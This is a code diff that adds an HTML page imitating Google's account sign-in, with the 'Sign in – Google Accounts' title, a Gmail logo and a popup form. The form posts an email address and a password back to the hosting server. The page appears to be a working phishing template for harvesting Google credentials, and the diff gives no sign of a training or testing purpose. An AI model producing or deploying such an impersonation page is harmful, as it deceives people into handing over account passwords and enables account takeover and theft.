@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Sign in – Google Accounts</title>
+  <style>
+    body {
+      background: rgba(0,0,0,0.6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .popup {
+      width: 400px;
+      background: #fff;
+      padding: 30px;
+      box-shadow: 0 0 20px #000;
+      border-radius: 8px;
+      text-align: center;
+    }
+    .popup img { width: 100px; }
+    input, button { width: 100%; margin: 10px 0; padding: 10px; }
+    button { background: #1a73e8; color: #fff; border: none; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <div class="popup">
+    <img src="/assets/gmail.png" alt="Gmail">
+    <form method="POST">
+      <input type="text" name="email" placeholder="Email or phone">
+      <input type="password" name="password" placeholder="Enter your password">
+      <button type="submit">Next</button>
+    </form>
+  </div>
+</body>
+</html>
